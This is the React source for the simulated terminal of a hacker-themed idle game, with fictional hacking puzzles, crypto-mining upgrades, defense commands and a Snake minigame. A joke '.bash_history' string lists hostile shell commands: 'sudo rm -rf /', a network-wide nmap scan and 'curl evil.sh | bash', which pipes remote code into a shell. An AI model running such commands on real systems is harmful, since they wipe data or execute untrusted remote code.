import { useState, useEffect, useRef } from 'react'
import { Audio, fmtCrypto, fmtHs, STORAGE_KEY } from './state.jsx'
import { useAuth } from './auth/AuthContext.jsx'
import socket from './socket.js'

const STAGE_NAMES = { portscan: 'PORT SCAN', password: 'CRACKING PASSWORD', cipher: 'DECRYPTION' }
const TYPE_LABELS  = { portscan: 'port', password: 'pass', cipher: 'crypt', chained: 'CHAIN' }

// Tier 2 constants
const TIER2_UNLOCK_AVG  = 5
const COOLING_DISCOUNT  = 0.98

// Defense constants and helpers
const FIREWALL_BASE_COST   = 0.10
const FIREWALL_COST_GROWTH = 2.0
const FIREWALL_MAX_LEVEL   = 5
const INCOME_PER_HS_TICK   = 0.001
const TICKS_PER_DAY        = 8640

const firewallCost    = (lvl) => FIREWALL_BASE_COST * Math.pow(FIREWALL_COST_GROWTH, lvl - 1)
const firewallChance  = (lvl) => ((lvl - 1) * 15) + '%'
const calcDailyIncome = (hs)  => hs * INCOME_PER_HS_TICK * TICKS_PER_DAY

function TermLine({ text, cls }) {
  return <div className={'term-line ' + (cls || '')}>{text}</div>
}

export function Terminal({ state, setState, onOpenApp }) {
  const [lines, setLines]   = useState([])
  const [input, setInput]   = useState('')
  const [history, setHistory] = useState([])
  const [histIdx, setHistIdx] = useState(-1)
  const [mode, setMode]     = useState({ name: 'shell' })
  const [busy, setBusy]     = useState(false)
  const bodyRef  = useRef(null)
  const inputRef = useRef(null)
  const { machine, setMachine } = useAuth()

  const push = (text, cls) => setLines(ls => [...ls, { text, cls, id: Math.random() }])
  const typeOut = async (text, cls, speedMul = 1) => {
    const tokens = text.split('')
    let buf = ''
    const id = Math.random()
    setLines(ls => [...ls, { text: '', cls, id }])
    const perChar = Math.max(4, (100 / (window.__typeSpeed || 22)) * speedMul)
    for (let i = 0; i < tokens.length; i++) {
      buf += tokens[i]
      setLines(ls => ls.map(l => l.id === id ? { ...l, text: buf } : l))
      if (i % 3 === 0) Audio.key()
      await new Promise(r => setTimeout(r, perChar))
    }
  }

  useEffect(() => {
    const onRemoteCmd = (e) => {
      if (e.detail) runCmd(e.detail)
    }
    window.addEventListener('terminal:run', onRemoteCmd)
    return () => window.removeEventListener('terminal:run', onRemoteCmd)
  }, [])

  useEffect(() => {
    ;(async () => {
      await typeOut(' /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$', 'mag', 0.3)
      await typeOut('| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/','mag', 0.3)
      await typeOut('| $$$$$$$$| $$$$$$$$| $$      | $$$$$$/  ','mag', 0.3)
      await typeOut('| $$_  $$ | $$__  $$| $$      | $$__  $$ ','mag', 0.3)
      await typeOut('| $$  | $$| $$  | $$|  $$$$$$/| $$  \\ $$','mag', 0.3)
      await typeOut('|__/  |__/|__/  |__/ \\______/ |__/  |__/','mag', 0.3)
      push('', '')
      await typeOut('HX//OS 2.4 — Terminal Session 0xDEADBEEF', 'ok')
      await typeOut(`Welcome back, operator. Hashrate: ${fmtHs(state.hashrate)} H/s  Balance: ${fmtCrypto(state.crypto)} ⟠`, 'dim')
      push("Type 'help' to list commands.", '')
      push('', '')
    })()
    setTimeout(() => inputRef.current?.focus(), 100)
  }, [])

  useEffect(() => {
    if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight
  }, [lines])

  useEffect(() => {
    const handler = ({ attacker }) => {
      setLines(ls => [...ls, { text: `[!] IDS ALERT: ${attacker} has established access to your machine!`, cls: 'err', id: Math.random() }])
      Audio.err()
    }
    socket.on('defense:ids_alert', handler)
    return () => socket.off('defense:ids_alert', handler)
  }, [])

  const sleep = (ms) => new Promise(r => setTimeout(r, ms))

  const runCmd = async (raw) => {
    const cmd = raw.trim()
    push(`root@hx-os:~# ${cmd}`, '')
    if (!cmd) return
    setHistory(h => [...h, cmd])
    setHistIdx(-1)
    const [c, ...args] = cmd.split(/\s+/)
    setBusy(true)
    try { await dispatch(c.toLowerCase(), args) }
    catch (e) { push('!! error: ' + e.message, 'err') }
    setBusy(false)
  }

  const dispatch = async (c, args) => {
    switch (c) {
      case 'help':  return help()
      case 'clear': case 'cls': return setLines([])
      case 'whoami': return push('root (uid=0) gid=0(wheel) — you are Zero Cool', 'ok')
      case 'date':   return push(new Date().toString(), 'dim')
      case 'ls':     return push('bin/  etc/  home/  var/  exploits/  wallet.dat  .bash_history', '')
      case 'cat':
        if (args[0] === 'wallet.dat') return push(`[ENCRYPTED WALLET]  balance: ${fmtCrypto(state.crypto)} ⟠`, 'ok')
        if (args[0] === '.bash_history') return push("sudo rm -rf /\nnmap -sS 10.0.0.0/8\ncurl evil.sh | bash\necho 'oh no'", 'dim')
        return push('cat: ' + (args[0] || '???') + ': no such file', 'err')
      case 'balance': case 'wallet': {
        const slaveHsW = Math.round((state.slaveEarned ?? 0) * 1000)
        const totalHsW = state.hashrate + slaveHsW
        const hsDetail = slaveHsW > 0 ? `${fmtHs(totalHsW)} H/s (${fmtHs(state.hashrate)} local + ${fmtHs(slaveHsW)} botnet)` : `${fmtHs(state.hashrate)} H/s`
        return push(`⟠ ${fmtCrypto(state.crypto)}   (hashrate: ${hsDetail})`, 'ok')
      }
      case 'sysinfo': case 'specs': return sysinfo()
      case 'scan': case 'nmap':  return scanHosts()
      case 'hack': case 'exploit':
        if (!args[0]) return push("hack: hostname required. try 'scan' first.", 'err')
        return hackHost(args[0])
      case 'mine':
        onOpenApp('miner'); return push('> launching miner.app…', 'ok')
      case 'snake': return playSnake()
      case 'irc':
        onOpenApp('irc'); return push('> launching irc.exe…', 'ok')
      case 'browser': case 'browse':
        onOpenApp('browser'); return push('> launching net::browser…', 'ok')
      case 'notes': case 'nano':
        onOpenApp('notepad'); return push('> opening notepad…', 'ok')
      case 'calc':
        onOpenApp('calculator'); return push('> calc.exe — launched', 'ok')
      case 'trash':
        onOpenApp('trash'); return push('> /tmp/.Trash — opening', 'ok')
      case 'upgrade': case 'shop': return listUpgrades(args[0])
      case 'sudo':
        push('[sudo] password for root: ••••••••', 'dim')
        await sleep(500)
        return push('sudo: nice try.', 'err')
      case 'rm':
        if (args.includes('-rf') && args.includes('/')) {
          await typeOut('rm: catastrophic kernel panic', 'err')
          await typeOut('haha. just kidding.', 'dim')
          return
        }
        return push(`rm: ${args[0] || '?'}: cannot remove`, 'err')
      case 'exit': case 'logout':
        return push('connection held open. ESC to close window.', 'dim')
      case 'reset':
        if (confirm('Wipe all progress?')) { localStorage.removeItem(STORAGE_KEY); location.reload() }
        return
      case 'matrix': return matrix()
      case 'coffee': return push('☕ nothing happens. but you feel more alert.', 'ok')
      case 'firewall': return defenseFirewall(args[0])
      case 'ids':      return defenseIds()
      case 'purge':    return defensePurge()
      default: return push(`bash: ${c}: command not found. try 'help'`, 'err')
    }
  }

  const help = () => {
    const cmds = [
      ['help',                         'this menu'],
      ['scan / nmap',                  'list reachable hosts'],
      ['hack <host>',                  'attempt to breach a target'],
      ['mine',                         'launch crypto miner'],
      ['irc',                          'open IRC messenger'],
      ['snake',                        'the classic. highscore wins ⟠'],
      ['upgrade [rig|cpu|net]',        'spend ⟠ on hardware (T1)'],
      ['upgrade [ram|storage|cooling]','Tier 2 upgrades (unlock: avg T1 ≥ 5)'],
      ['sysinfo',                      'show rig levels, H/s, and next upgrade costs'],
      ['balance',                      'show wallet'],
      ['browser / notes / calc / trash', 'open GUI apps'],
      ['whoami, ls, cat, date',        'unix classics'],
      ['matrix',                       '…follow the white rabbit'],
      ['clear',                        'clear screen'],
      ['reset',                        'wipe saved progress'],
      ['firewall [upgrade]',           'upgrade firewall (blocks incoming hacks)'],
      ['ids',                          'toggle intrusion detection system'],
      ['purge',                        'evict all botnet intruders (costs 2× daily income)'],
    ]
    push('─── AVAILABLE COMMANDS ─────────────────────', 'mag')
    cmds.forEach(([c, d]) => push(`  ${c.padEnd(26)} ${d}`, ''))
    push('────────────────────────────────────────────', 'mag')
  }

  const scanHosts = async () => {
    await typeOut('Querying network topology…', 'dim')
    let targets
    try {
      const r = await fetch('/api/hack/targets', { credentials: 'include' })
      targets = await r.json()
      if (!r.ok || !Array.isArray(targets)) return push('[ERR] Scan failed — server error.', 'err')
    } catch {
      return push('[ERR] Network unreachable.', 'err')
    }

    const fmtStatus = (t) => {
      if (!t.expires_at) return '-'
      const ms = new Date(t.expires_at) - Date.now()
      if (ms <= 0) return '[exp]'
      const h = Math.floor(ms / 3600000)
      const m = Math.floor((ms % 3600000) / 60000)
      return h > 0 ? `[${h}h${String(m).padStart(2,'0')}m]` : `[${m}m]`
    }

    await typeOut('╔═══════════════════════════════════════════════════════════════╗', 'mag', 0.2)
    await typeOut('║  HOST                    IP              T   TYPE    STATUS   ║', 'mag', 0.2)
    await typeOut('╠═══════════════════════════════════════════════════════════════╣', 'mag', 0.2)
    for (const t of targets) {
      const status  = fmtStatus(t)
      const owned   = !!t.expires_at
      const typeStr = (TYPE_LABELS[t.puzzle_kind] || t.puzzle_kind).padEnd(7)
      const inner   = `  ${t.hostname.padEnd(25)}${t.ip.padEnd(16)}T${t.tier}  ${typeStr}${status}`
      await typeOut(inner.padEnd(64) + '║', owned ? 'ok' : '', 0.15)
    }
    await typeOut('╚═══════════════════════════════════════════════════════════════╝', 'mag', 0.2)
    push('→ use: hack <hostname>', 'dim')
  }

  const hackHost = async (name) => {
    if (!name) return push("hack: hostname required. try 'scan' first.", 'err')

    await typeOut(`[*] Connecting to ${name}…`, 'dim')
    await sleep(300)

    let startData
    try {
      const r = await fetch('/api/hack/start', {
        method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ hostname: name }),
      })
      startData = await r.json()
      if (!r.ok) {
        if (startData.error === 'already_owned')  return push('[i] Access already established.', 'dim')
        if (startData.error === 'unknown target') return push(`hack: unknown host '${name}'. try 'scan'.`, 'err')
        return push(`[ERR] ${startData.message || startData.error}`, 'err')
      }
    } catch {
      return push('[ERR] Connection timeout.', 'err')
    }

    if (startData.flavor) {
      await typeOut(`[*] ${startData.flavor}`, 'mag')
      await sleep(250)
    }

    let { session_id, puzzle_kind, display, total_stages } = startData
    let currentStage = 0

    while (true) {
      if (total_stages > 1) {
        await typeOut(`[*] Stage ${currentStage + 1} of ${total_stages}: ${STAGE_NAMES[puzzle_kind] || puzzle_kind.toUpperCase()}…`, 'mag')
        await sleep(200)
      }

      let answer
      if (puzzle_kind === 'portscan')      answer = await renderPortscan(display)
      else if (puzzle_kind === 'password') answer = await renderPassword(display)
      else if (puzzle_kind === 'cipher')   answer = await renderCipher(display)
      else return push('[ERR] Unknown puzzle type.', 'err')

      await typeOut('[*] Transmitting exploit payload…', 'dim')

      let solve
      try {
        const r = await fetch('/api/hack/solve', {
          method: 'POST', credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ session_id, answer }),
        })
        solve = await r.json()
        if (!r.ok) return push(`[ERR] ${solve.message || solve.error}`, 'err')
      } catch {
        return push('[ERR] Connection timeout.', 'err')
      }

      if (!solve.success) return hackFail(solve.message)

      if (solve.complete === false) {
        await typeOut(`[✓] Stage ${currentStage + 1} breached. Escalating privileges…`, 'ok')
        Audio.ok()
        await sleep(200)
        puzzle_kind  = solve.puzzle_kind
        display      = solve.display
        currentStage = solve.stage
        continue
      }

      await hackSuccess(name, solve.reward)
      break
    }
  }

  const renderPortscan = async (display) => {
    for (const { port, open, service } of display.ports) {
      await typeOut(`   ${port}/tcp  ${open ? 'OPEN  ' : 'closed'}  ${service}`, open ? 'ok' : 'dim', 0.15)
      await sleep(40)
    }
    push('[?] Which port do you exploit? (type number)', 'warn')
    return prompt('exploit :')
  }

  const renderPassword = async (display) => {
    await typeOut('[*] Dictionary attack against admin account…', 'dim')
    await sleep(300)
    await typeOut(`[!] Fragment recovered from memory dump:  ${display.hint}`, 'warn')
    await typeOut(`[!] Length: ${display.length}. Possible words in leaked DB:`, 'warn')
    display.choices.forEach((p, i) => push(`   [${i+1}] ${p}`, ''))
    return prompt('password> ')
  }

  const renderCipher = async (display) => {
    await typeOut('[*] Intercepted transmission (ROT-13 suspected):', 'dim')
    await typeOut(`    ${display.encoded}`, 'warn')
    await typeOut('[?] Decrypt the above phrase.', 'mag')
    return prompt('plaintext> ')
  }

  const hackSuccess = async (hostname, reward) => {
    await typeOut(`[✓] BREACH SUCCESSFUL — ${hostname}`, 'ok')
    Audio.ok()
    await typeOut(`[$] Transferring ${reward.toFixed(4)} ⟠ to wallet…`, 'ok')
    setState(s => ({ ...s, crypto: s.crypto + reward, hackedHosts: Array.from(new Set([...s.hackedHosts, hostname])) }))
    await typeOut('[$] Hack the planet. Botnet node registered.', 'mag')
  }

  const hackFail = async (message) => {
    await typeOut('[×] DETECTED. ICE engaged. Disconnecting…', 'err')
    Audio.err()
    await typeOut(`    ${message}`, 'dim')
  }

  const pendingRef = useRef(null)
  const prompt = (label) => new Promise((resolve) => {
    setMode({ name: 'prompt', label })
    pendingRef.current = resolve
  })
  const resolvePrompt = (val) => {
    if (pendingRef.current) {
      const r = pendingRef.current
      pendingRef.current = null
      setMode({ name: 'shell' })
      push(`${mode.label || '?'}${val}`, '')
      r(val)
    }
  }

  const sysinfo = () => {
    const SPECS = [
      { label: 'Mining Rig',    col: 'rigLevel',  baseHs: 5,  hsGrowth: 1.4, baseCost: 0.05, costGrowth: 1.6 },
      { label: 'Overclock CPU', col: 'cpuLevel',  baseHs: 12, hsGrowth: 1.5, baseCost: 0.12, costGrowth: 1.7 },
      { label: 'Dark Fiber',    col: 'netLevel',  baseHs: 30, hsGrowth: 1.7, baseCost: 0.25, costGrowth: 1.9 },
    ]
    const slaveHs      = Math.round((state.slaveEarned ?? 0) * 1000)
    const avgTier1     = (state.rigLevel + state.cpuLevel + state.netLevel) / 3
    const tier2Unlocked = avgTier1 >= TIER2_UNLOCK_AVG
    const ramLevel     = state.ramLevel     ?? 1
    const storageLevel = state.storageLevel ?? 1
    const coolingLevel = state.coolingLevel ?? 1

    push('─── SYSTEM SPECS ───────────────────────', 'mag')
    for (const s of SPECS) {
      const lvl      = state[s.col]
      const hs       = Math.round(s.baseHs * Math.pow(s.hsGrowth, lvl - 1))
      const nextCost = expCost(s, lvl, coolingLevel)
      push(`  ${s.label.padEnd(16)} L${String(lvl).padStart(2)}   ${fmtHs(hs).padStart(9)} H/s   next: ${fmtCrypto(nextCost)} ⟠`, '')
    }
    push(`  ${'Botnet slaves'.padEnd(16)}        ${fmtHs(slaveHs).padStart(9)} H/s`, slaveHs > 0 ? 'warn' : 'dim')
    push(`${'  TOTAL'.padEnd(16)}       ${fmtHs(state.hashrate + slaveHs).padStart(9)} H/s`, 'ok')
    push(`  wallet: ${fmtCrypto(state.crypto)} ⟠`, 'dim')

    push('─── TIER 2 MODULES ─────────────────────', tier2Unlocked ? 'mag' : 'dim')
    if (tier2Unlocked) {
      const ramMult  = (1 + 0.25 * (ramLevel - 1)).toFixed(2)
      const costDisc = ((1 - Math.pow(COOLING_DISCOUNT, coolingLevel - 1)) * 100).toFixed(1)
      push(`  RAM Expansion    L${String(ramLevel).padStart(2)}   income ×${ramMult}`, '')
      push(`  Storage Array    L${String(storageLevel).padStart(2)}   +${storageLevel} offline tick${storageLevel > 1 ? 's' : ''}`, '')
      push(`  Cooling Unit     L${String(coolingLevel).padStart(2)}   -${costDisc}% upgrade cost`, '')
    } else {
      push(`  [LOCKED] avg T1 ${avgTier1.toFixed(1)} / ${TIER2_UNLOCK_AVG} required`, 'dim')
    }
  }

  const UPGRADE_CFG = {
    rig:     { name: 'Mining Rig',    col: 'rigLevel',     baseHs: 5,  hsGrowth: 1.4, baseCost: 0.05, costGrowth: 1.6 },
    cpu:     { name: 'Overclock CPU', col: 'cpuLevel',     baseHs: 12, hsGrowth: 1.5, baseCost: 0.12, costGrowth: 1.7 },
    net:     { name: 'Dark Fiber',    col: 'netLevel',     baseHs: 30, hsGrowth: 1.7, baseCost: 0.25, costGrowth: 1.9 },
    ram:     { name: 'RAM Expansion', col: 'ramLevel',     baseHs: 0,  hsGrowth: 1.0, baseCost: 0.50, costGrowth: 1.8, tier2: true },
    storage: { name: 'Storage Array', col: 'storageLevel', baseHs: 0,  hsGrowth: 1.0, baseCost: 0.80, costGrowth: 2.0, tier2: true },
    cooling: { name: 'Cooling Unit',  col: 'coolingLevel', baseHs: 0,  hsGrowth: 1.0, baseCost: 1.00, costGrowth: 2.2, tier2: true },
  }
  const expCost = (cfg, level, coolingLevel = 1) => {
    const base = cfg.baseCost * Math.pow(cfg.costGrowth, level - 1)
    return base * Math.pow(COOLING_DISCOUNT, coolingLevel - 1)
  }
  const expHs   = (cfg, level) => Math.round(cfg.baseHs * Math.pow(cfg.hsGrowth, level - 1))

  const listUpgrades = (which) => {
    const avgTier1 = (state.rigLevel + state.cpuLevel + state.netLevel) / 3
    const tier2Unlocked = avgTier1 >= TIER2_UNLOCK_AVG

    const items = Object.entries(UPGRADE_CFG).map(([k, cfg]) => {
      const level  = state[cfg.col] ?? 1
      const cost   = expCost(cfg, level, state.coolingLevel)
      const hsNow  = expHs(cfg, level)
      const hsNext = expHs(cfg, level + 1)
      return { k, name: cfg.name, level, cost, col: cfg.col, hs: hsNext - hsNow, cfg, tier2: !!cfg.tier2 }
    })

    if (!which) {
      push('─── TIER 1 HARDWARE ───────────────────────', 'mag')
      items.filter(it => !it.tier2).forEach(it =>
        push(`  ${it.k.padEnd(8)} L${it.level}  cost ${fmtCrypto(it.cost)} ⟠   +${fmtHs(it.hs)} H/s`, ''))

      if (tier2Unlocked) {
        push('─── TIER 2 HARDWARE ── UNLOCKED ───────────', 'ok')
        items.filter(it => it.tier2).forEach(it => {
          const coolingLevel = state.coolingLevel ?? 1
          const effect = it.k === 'ram'
            ? `×${(1 + 0.25 * it.level).toFixed(2)} income`
            : it.k === 'storage'
              ? `+${it.level} offline tick${it.level > 1 ? 's' : ''}`
              : `-${((1 - Math.pow(COOLING_DISCOUNT, coolingLevel - 1)) * 100).toFixed(1)}% cost`
          push(`  ${it.k.padEnd(8)} L${it.level}  cost ${fmtCrypto(it.cost)} ⟠   ${effect}`, '')
        })
      } else {
        push(`─── TIER 2 HARDWARE ── LOCKED (avg T1 ${avgTier1.toFixed(1)}/${TIER2_UNLOCK_AVG}) ──`, 'dim')
        push('  ram / storage / cooling — upgrade T1 to unlock', 'dim')
      }

      push('  buy with: upgrade <rig|cpu|net|ram|storage|cooling>', 'dim')
      return
    }

    const it = items.find(x => x.k === which)
    if (!it) return push('upgrade: unknown part', 'err')
    if (it.tier2 && !tier2Unlocked) {
      return push(`[LOCKED] Tier 2 unlocks when avg T1 level ≥ ${TIER2_UNLOCK_AVG}. Current: ${avgTier1.toFixed(1)}`, 'err')
    }
    if (state.crypto < it.cost) return push(`insufficient funds. need ${fmtCrypto(it.cost)} ⟠.`, 'err')

    setState(s => ({
      ...s,
      crypto:   s.crypto - it.cost,
      hashrate: s.hashrate + it.hs,
      [it.col]: (s[it.col] ?? 1) + 1,
    }))
    push(`[+] installed ${it.name} L${it.level + 1}.${it.hs > 0 ? ` +${fmtHs(it.hs)} H/s.` : ''}`, 'ok')
    Audio.coin()

    fetch('/api/machine/upgrade', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ kind: it.k }),
    })
      .then(r => r.json())
      .then(data => {
        if (data.ok) {
          const patch = { crypto: data.newCrypto, hashrate: data.newHashrate }
          if (data.upgrade.kind === 'ram')     patch.ramLevel     = data.upgrade.newLevel
          if (data.upgrade.kind === 'storage') patch.storageLevel = data.upgrade.newLevel
          if (data.upgrade.kind === 'cooling') patch.coolingLevel = data.upgrade.newLevel
          setState(s => ({ ...s, ...patch }))
        } else if (data.error === 'tier2_locked') {
          push(`[ERR] ${data.message}`, 'err')
          setState(s => ({ ...s, crypto: s.crypto + it.cost, [it.col]: (s[it.col] ?? 1) - 1 }))
        }
      })
      .catch(() => {})
  }

  const matrix = async () => {
    for (let r = 0; r < 14; r++) {
      let s = ''
      for (let c = 0; c < 40; c++) s += '01アイウエカキクケコサシスセ'[Math.floor(Math.random() * 14)]
      await typeOut(s, 'ok', 0.1)
    }
    push('wake up.', 'mag')
  }

  const defenseFirewall = async (sub) => {
    const lvl = machine?.firewall_lvl ?? 1
    if (!sub) {
      push('─── FIREWALL STATUS ──────────────────────', 'mag')
      push(`  Level : ${lvl} / ${FIREWALL_MAX_LEVEL}`, '')
      push(`  Block : ${firewallChance(lvl)} of incoming hacks`, lvl > 1 ? 'ok' : 'dim')
      if (lvl < FIREWALL_MAX_LEVEL) {
        const cost = firewallCost(lvl)
        push(`  Upgrade cost : ${fmtCrypto(cost)} ⟠  →  use: firewall upgrade`, 'dim')
      } else {
        push('  Maximum level reached.', 'ok')
      }
      return
    }
    if (sub !== 'upgrade') return push("firewall: unknown sub-command. try 'firewall upgrade'", 'err')
    if (lvl >= FIREWALL_MAX_LEVEL) return push('Firewall already at maximum level.', 'dim')

    const cost = firewallCost(lvl)
    if (state.crypto < cost) return push(`Insufficient funds. Need ${fmtCrypto(cost)} ⟠.`, 'err')

    await typeOut('[*] Patching firewall ruleset…', 'dim')
    try {
      const r = await fetch('/api/machine/defense/firewall', {
        method: 'POST', credentials: 'include',
      })
      const data = await r.json()
      if (!r.ok) return push(`[ERR] ${data.message || data.error}`, 'err')

      setMachine(m => ({ ...m, firewall_lvl: data.newFirewallLvl }))
      setState(s => ({ ...s, crypto: data.newCrypto }))
      push(`[✓] Firewall upgraded to L${data.newFirewallLvl}. Block chance: ${firewallChance(data.newFirewallLvl)}.`, 'ok')
      Audio.ok()
    } catch {
      push('[ERR] Request failed.', 'err')
    }
  }

  const defenseIds = async () => {
    const active = machine?.ids_active ?? false
    await typeOut(`[*] ${active ? 'Disabling' : 'Enabling'} IDS…`, 'dim')
    try {
      const r = await fetch('/api/machine/defense/ids', {
        method: 'POST', credentials: 'include',
      })
      const data = await r.json()
      if (!r.ok) return push(`[ERR] ${data.message || data.error}`, 'err')

      setMachine(m => ({ ...m, ids_active: data.idsActive }))
      push(data.idsActive
        ? '[✓] IDS enabled. You will be alerted when intruders connect.'
        : '[i] IDS disabled.', data.idsActive ? 'ok' : 'dim')
    } catch {
      push('[ERR] Request failed.', 'err')
    }
  }

  const defensePurge = async () => {
    const daily = calcDailyIncome(state.hashrate)
    const cost  = daily * 2
    push(`[!] Purge will evict all botnet access from your machine.`, 'warn')
    push(`    Cost: ${fmtCrypto(cost)} ⟠  (2× daily income).`, 'warn')
    if (state.crypto < cost) return push(`Insufficient funds. Need ${fmtCrypto(cost)} ⟠.`, 'err')

    const confirm = await prompt('Confirm purge? (yes/no) > ')
    if (confirm?.trim().toLowerCase() !== 'yes') return push('[i] Purge cancelled.', 'dim')

    await typeOut('[*] Initiating trace and purge sequence…', 'dim')
    try {
      const r = await fetch('/api/machine/defense/purge', {
        method: 'POST', credentials: 'include',
      })
      const data = await r.json()
      if (!r.ok) return push(`[ERR] ${data.message || data.error}`, 'err')

      setState(s => ({ ...s, crypto: data.newCrypto }))
      push(`[✓] Purge complete. ${data.purgedCount} intruder(s) evicted.`, 'ok')
      Audio.ok()
    } catch {
      push('[ERR] Request failed.', 'err')
    }
  }

  const [snake, setSnake] = useState(null)
  const playSnake = () => {
    push('─── SNAKE.SH — arrow keys to play, Q to quit ───', 'mag')
    setSnake({ state: 'play' })
  }

  const onKey = async (e) => {
    if (busy && mode.name === 'shell') return
    if (e.key === 'Enter') {
      if (mode.name === 'prompt') { resolvePrompt(input); setInput(''); return }
      const v = input; setInput(''); await runCmd(v)
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (history.length) { const i = histIdx < 0 ? history.length - 1 : Math.max(0, histIdx - 1); setHistIdx(i); setInput(history[i]) }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (histIdx >= 0) { const i = histIdx + 1; if (i >= history.length) { setHistIdx(-1); setInput('') } else { setHistIdx(i); setInput(history[i]) } }
    }
  }

  const promptStr = mode.name === 'prompt' ? mode.label : 'root@hx-os:~#'

  return (
    <div className="terminal-body" ref={bodyRef} onClick={() => inputRef.current?.focus()}>
      {lines.map(l => <TermLine key={l.id} text={l.text} cls={l.cls} />)}
      {snake?.state === 'play' && (
        <SnakeInline onDone={(score) => {
          const reward = Math.max(0, Math.floor(score / 3)) * 0.002
          push(`[GAME OVER] score: ${score}. reward: ${reward.toFixed(4)} ⟠`, reward > 0 ? 'ok' : 'dim')
          if (score > state.snakeHigh) push('[!] new high score!', 'mag')
          setState(s => ({ ...s, crypto: s.crypto + reward, snakeHigh: Math.max(s.snakeHigh, score) }))
          setSnake(null)
          setTimeout(() => inputRef.current?.focus(), 50)
        }} />
      )}
      {!snake && (
        <div className="term-input-line">
          <span className="prompt">{promptStr}</span>
          <input
            ref={inputRef}
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={onKey}
            autoFocus
            spellCheck={false}
            autoComplete="off"
          />
        </div>
      )}
    </div>
  )
}

// ── Inline Snake ─────────────────────────────────────────────────────────────
function SnakeInline({ onDone }) {
  const W = 28, H = 14
  const [snake, setSnake] = useState([{ x: 5, y: 7 }, { x: 4, y: 7 }, { x: 3, y: 7 }])
  const [dir, setDir]     = useState({ x: 1, y: 0 })
  const [food, setFood]   = useState({ x: 12, y: 7 })
  const [score, setScore] = useState(0)
  const [alive, setAlive] = useState(true)
  const dirRef   = useRef(dir);   dirRef.current   = dir
  const aliveRef = useRef(true);  aliveRef.current = alive
  const scoreRef = useRef(0)
  const foodRef  = useRef(food);  foodRef.current  = food

  useEffect(() => {
    const onK = (e) => {
      if (!aliveRef.current) return
      const d = dirRef.current
      if ((e.key === 'ArrowUp'    || e.key === 'w') && d.y !== 1)  setDir({ x: 0, y: -1 })
      else if ((e.key === 'ArrowDown'  || e.key === 's') && d.y !== -1) setDir({ x: 0, y: 1  })
      else if ((e.key === 'ArrowLeft'  || e.key === 'a') && d.x !== 1)  setDir({ x: -1, y: 0 })
      else if ((e.key === 'ArrowRight' || e.key === 'd') && d.x !== -1) setDir({ x: 1, y: 0  })
      else if (e.key === 'q' || e.key === 'Q' || e.key === 'Escape') { aliveRef.current = false; setAlive(false); onDone(score) }
      if (e.key.startsWith('Arrow')) e.preventDefault()
    }
    window.addEventListener('keydown', onK)
    return () => window.removeEventListener('keydown', onK)
  }, [])

  useEffect(() => {
    if (!alive) return
    const id = setInterval(() => {
      setSnake(prev => {
        const head = { x: prev[0].x + dirRef.current.x, y: prev[0].y + dirRef.current.y }
        if (head.x < 0 || head.x >= W || head.y < 0 || head.y >= H || prev.some(s => s.x === head.x && s.y === head.y)) {
          aliveRef.current = false; setAlive(false)
          setTimeout(() => onDone(scoreRef.current), 10)
          return prev
        }
        const ate = head.x === foodRef.current.x && head.y === foodRef.current.y
        const next = [head, ...prev]
        if (!ate) next.pop()
        else {
          Audio.coin()
          scoreRef.current += 1; setScore(scoreRef.current)
          let nf
          do { nf = { x: Math.floor(Math.random() * W), y: Math.floor(Math.random() * H) } }
          while (next.some(s => s.x === nf.x && s.y === nf.y))
          setFood(nf); foodRef.current = nf
        }
        return next
      })
    }, 120)
    return () => clearInterval(id)
  }, [alive])

  const grid = []
  for (let y = 0; y < H; y++) {
    let row = ''
    for (let x = 0; x < W; x++) {
      if (snake.some((s, i) => s.x === x && s.y === y && i === 0)) row += '@'
      else if (snake.some(s => s.x === x && s.y === y)) row += 'o'
      else if (food.x === x && food.y === y) row += '◆'
      else row += '·'
    }
    grid.push(row)
  }
  return (
    <div>
      <div className="term-line mag">SCORE: {score}    [arrows to move, Q to quit]</div>
      <div className="term-line ok">┌{'─'.repeat(W)}┐</div>
      {grid.map((r, i) => <div key={i} className="term-line ok">│{r}│</div>)}
      <div className="term-line ok">└{'─'.repeat(W)}┘</div>
    </div>
  )
}
